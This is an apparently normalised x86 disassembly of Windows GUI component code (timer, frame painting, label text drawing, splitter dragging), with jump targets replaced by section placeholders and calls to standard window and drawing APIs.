test ebx ebx
jg r-xdata
sub_43046c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e29c
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_445f20
mov edx 0x32
mov eax esi
call sub_445f44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_430510
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423e04
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_416eec
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_416eec
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_416eec
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_424880
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_423e04
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_416eec
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_416eec
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_416eec
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_424880
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430600
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_423e04
mov ecx edi
mov edx esi
mov eax ebx
call sub_424854
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4247f4
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_430640
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_423f10
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423ee0
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_423ec4
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423e04
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_424200
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_423ee0
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_423ec4
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_423e04
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_424200
mov eax [ ebp - 0x4 ]
call sub_446168
push eax
mov eax [ ebp - 0x4 ]
call sub_4461ac
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4248b8
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_430732 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0x1c ]
call sub_430510
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_416f14
lea eax [ ebp - 0x1c ]
call sub_430510
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_416f14
lea eax [ ebp - 0x1c ]
call sub_430510
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_430600
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_430600
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_430600
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_430600
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_430600
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_430600
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_430600
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_430600
pop ecx
sub_4308c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_430950
call sub_4219b8
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_430918
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4309c4
mov eax [ esi + 0x34 ]
call sub_421a6c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_430950
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_43098a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4309c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_430a43
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a4a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
sub_430a9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44ecd8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43af70
call sub_43b050
test al al
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov edx 0xb9
mov eax esi
call sub_445f20
mov edx 0x29
mov eax esi
call sub_445f44
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_430eec
mov edx 0x1
mov eax esi
call sub_430f08
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_446904
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_44d2e8
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_430b60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449ee0
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_430bd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c66c
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44a5f4
sub_430c10
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_430d00
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_446764
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44b530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d07
lea eax [ ebp - 0x14 ]
call sub_403fe8
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44d054
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44d054
push eax
call InvalidateRect
sub_430d10
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_430d48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430eaa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_43040c
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_430d10
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43040c
mov esi [ ebx + 0x208 ]
call sub_43af70
call sub_43b050
test al al
je r-xdata
push ebp
call sub_430d10
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_43040c
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4240e4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_42477c
mov eax ebx
call sub_44e254
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_448a38
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446764
mov eax [ ebp - 0x1c ]
call sub_4044a8
push eax
mov eax esi
call sub_424b20
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430eb1
lea eax [ ebp - 0x1c ]
call sub_403fe8
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424200
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_424a40
mov edx r-xdata
mov eax esi
call sub_42499c
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_430f5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4490c0
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_430fb4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44bce8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_4310d5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44bce8
call sub_403ad0
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445f44
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_445f20
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4310f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44db9c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43111c
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_44e25c
pop esi
pop ebx
retn
sub_431158
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e29c
mov [ esi + 0x16c ] 0x1
mov dl 0x3
mov eax esi
call sub_445c78
mov edx 0x3
mov eax esi
call sub_445f20
mov dx 0xfff2
mov eax esi
call sub_446970
mov [ esi + 0x188 ] 0x1e
mov [ esi + 0x1a8 ] 0x3
mov [ esi + 0x1a0 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4311d0
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x170 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44e2f8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_431200
push ebx
push esi
mov ebx eax
push 0x412
push 0x0
mov eax [ ebx + 0x30 ]
call sub_44d054
push eax
call GetDCEx
mov [ ebx + 0x180 ] eax
cmp [ ebx + 0x1a8 ] 0x3
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
mov eax [ ebx + 0x170 ]
call sub_424118
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
mov [ ebx + 0x1a4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f3c
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx 0xffffff
xor eax eax
call sub_4293e4
mov edx eax
mov eax esi
call sub_4240b8
sub_43127c
push ebx
add esp 0xfffffff8
mov ebx eax
mov al [ ebx + 0x184 ]
xor al 0x1
mov [ ebx + 0x184 ] al
mov ecx esp
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416eec
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x1ac ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x40 ]
add eax [ ebx + 0x1ac ]
mov [ esp ] eax
jmp r-xdata
push r--data
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call PatBlt
pop ecx
pop edx
pop ebx
retn
sub_4312e8
push ebx
mov ebx eax
mov eax [ ebx + 0x1a4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
mov eax [ ebx + 0x30 ]
call sub_44d054
push eax
call ReleaseDC
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
push eax
mov eax [ ebx + 0x180 ]
push eax
call SelectObject
pop ebx
retn
call sub_403270
xor eax eax
mov [ ebx + 0x170 ] eax
sub_431330
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi eax
xor ebx ebx
mov ecx esp
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416eec
mov al [ esi + 0x5b ]
dec al
je r-xdata
dec [ esp + 0x4 ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esi + 0x30 ]
call sub_449d84
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ esi + 0x4c ]
add [ esp + 0x4 ] eax
dec al
je r-xdata
xor ebx ebx
inc edi
xor ebp ebp
dec [ esp ]
jmp r-xdata
dec al
je r-xdata
inc ebp
dec edi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x48 ]
add [ esp ] eax
jmp r-xdata
jmp r-xdata
mov edx ebp
mov eax [ esi + 0x30 ]
call sub_449d48
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_446104
mov eax [ esp + 0x10 ]
sub eax [ esp + 0x8 ]
jne r-xdata
mov eax ebx
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
sub eax [ esp + 0xc ]
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov al [ esi + 0x5b ]
sub al 0x1
je r-xdata
dec [ esp + 0x8 ]
jmp r-xdata
sub al 0x2
jne r-xdata
dec [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc [ esp + 0x10 ]
inc [ esp + 0x14 ]
sub_43141c
push ebx
mov ebx eax
mov eax ebx
call sub_445b70
mov ax [ ebx + 0x78 ]
cmp ax 0xfff1
je r-xdata
mov al [ ebx + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp ax 0xfff2
jne r-xdata
mov dx 0xfff2
mov eax ebx
call sub_446970
mov dx 0xfff1
mov eax ebx
call sub_446970
jmp r-xdata
pop ebx
retn
sub_431458
push ebx
push esi
add esp 0xffffffe0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_4240e4
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x10 ]
mov eax [ ebx + 0x160 ]
call sub_42477c
cmp [ ebx + 0x16d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov eax [ esi + 0x10 ]
mov dl 0x2
call sub_423ee0
mov eax [ esi + 0x10 ]
mov dl 0xe
call sub_423ec4
mov eax [ esi + 0x10 ]
mov edx 0xffd8ce
call sub_423e04
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_424200
mov eax ebx
call sub_446168
push eax
mov eax ebx
call sub_4461ac
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_4248b8
push 0xffffffff
push 0x2
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0x2
push 0xffffffff
lea eax [ esp + 0x8 ]
push eax
call InflateRect
jmp r-xdata
add esp 0x20
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000014
call sub_423458
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424b20
push eax
call FrameRect
push esi
call DeleteObject
push 0xfffffffe
push 0xfffffffe
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov eax 0xff000010
call sub_423458
push eax
call CreateSolidBrush
mov esi eax
push esi
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_424b20
push eax
call FrameRect
push esi
call DeleteObject
sub_4315b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi ]
cmp edx [ ebx + 0x188 ]
jg r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor edx edx
mov [ esi ] edx
sub_4315e4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x1b2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_431610
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_447d20
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_431330
mov [ ebx + 0x174 ] eax
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_416eec
mov eax [ ebp - 0xc ]
mov [ ebx + 0x178 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x17c ] eax
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
call sub_4461ac
